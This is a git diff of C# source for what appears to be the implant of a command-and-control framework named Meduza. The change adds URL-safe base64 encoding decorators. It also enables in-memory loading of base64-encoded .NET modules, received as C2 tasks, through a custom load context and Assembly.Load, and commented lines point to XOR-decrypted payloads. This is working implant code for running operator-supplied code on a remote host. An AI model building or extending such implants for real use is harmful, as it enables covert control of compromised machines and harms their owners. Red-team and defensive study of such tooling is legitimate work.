@@ -1,26 +1,25 @@
-﻿using Agent;
-using Agent.Models;
+﻿using Agent.Models;
 using Agent.Services;
 using System.Collections.Concurrent;
 using System.Diagnostics;
-using System.IO;
 using System.IO.Pipes;
 using Agent.ModuleBase;
 using Agent.Models.C2Request;
 using System.Text.Json;
-using System.IO;
-using System.Threading;
-using System.Threading.Tasks;
-using System.Collections.Generic;
-using System.Net.Http;
-using System.Text.Json.Serialization;
-using System.Net.Http.Json;
 using Agent.Core;
 using System.Reflection;
+using Meduza.Agent;
+using Agent.Core.Utils.MessageTransformer;
+using Agent.Core.Utils.Encoding;
 
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
+
+// Decorator
+var baseTransformer = new BaseTransformer();
+var urlSafeBase64EncodingDecorator = new UrlSafeBase64EncodingDecorator(baseTransformer);
+var urlSafeBase64DecodingDecorator = new UrlSafeBase64DecodingDecorator(baseTransformer);
 
 // Queues, random and agentInfo 
 var taskQueue = new ConcurrentQueue<AgentTask>();
@@ -104,18 +103,18 @@ while (true)
                     {
                         task.QueueRunningStatus(messageQueue, messageQueueLock);
 
-                        //ModuleLoadContext loadContext = new();
+                        ModuleLoadContext loadContext = new();
                         using (var stream = new MemoryStream())
                         {
                             var decodedModule = Convert.FromBase64String(task.Module);
-                            //var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
-                            //stream.Write(decodedModule);
-                            //loadContext.AssemblyBytes = stream;
-                            //stream.Position = 0;
-                            //var loadedAssembly = loadContext.LoadFromStream(stream);
+                            // var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
+                            stream.Write(decodedModule);
+                            loadContext.AssemblyBytes = stream;
+                            stream.Position = 0;
+                            var loadedAssembly = loadContext.LoadFromStream(stream);
 
-                            //var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
-                            //var decryptedBytes = Encoding.UTF8.GetBytes(decryptedModule);
+                            // var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
+                            // var decryptedBytes = System.Text.Encoding.UTF8.GetBytes(decryptedModule);
                             var module = ModuleLoader.LoadModule(Assembly.Load(decodedModule));
                             foreach (var moduleCommand in module.Commands)
                             {
